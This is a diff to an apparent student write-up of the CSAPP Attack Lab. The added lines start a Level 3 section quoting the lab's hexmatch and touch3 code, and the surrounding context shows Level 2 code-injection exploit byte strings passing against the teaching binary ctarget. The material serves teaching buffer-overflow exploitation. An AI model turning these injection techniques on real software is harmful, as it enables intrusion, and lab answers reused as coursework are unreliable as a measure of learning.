@@ -199,7 +199,7 @@ Here is final exploit string:
 We pass the test:
 
 ```bash
-~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level2/CI_Level2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 
+➜ ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level2/CI_Level2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 
 	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
 ```
 
@@ -214,13 +214,41 @@ The exploit string should be like this:
 Also pass the test:
 
 ```bash
-~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level2/CI_Level2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+➜ ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level2/CI_Level2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 			 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A8 DC 61 55 
 	 		 00 00 00 00 48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 
 ```
 
 ### 1.3 Level 3
 
+Phase 3 also involves a code injection attack, but **passing a string as argumen**t.
+
+Within the ﬁle `ctarget` there is code for functions `hexmatch` and `touch3` having the following C representations:
+
+```c
+/* Compare string to hex represention of unsigned value */
+int hexmatch(unsigned val, char *sval) {
+    char cbuf[110];
+    /* Make position of check string unpredictable */
+    char *s = cbuf + random() % 100;
+    sprintf(s, "%.8x", val);
+    return strncmp(sval, s, 9) == 0;
+}
+
+void touch3(char *sval) {
+    vlevel = 3; /* Part of validation protocol */
+    if (hexmatch(cookie, sval)) {
+        printf("Touch3!: You called touch3(\"%s\")\n", sval);
+        validate(3);
+    } else {
+        printf("Misfire: You called touch3(\"%s\")\n", sval);
+        fail(3);
+    }
+    exit(0);
+}
+```
+
+The task is to get `CTARGET` to execute the code for `touch3` rather than returning to test. We must make it appear to `touch3` as if you have passed a string representation of your cookie as its argument.
 
 ##	Part II: Return-Oriented Programming
 
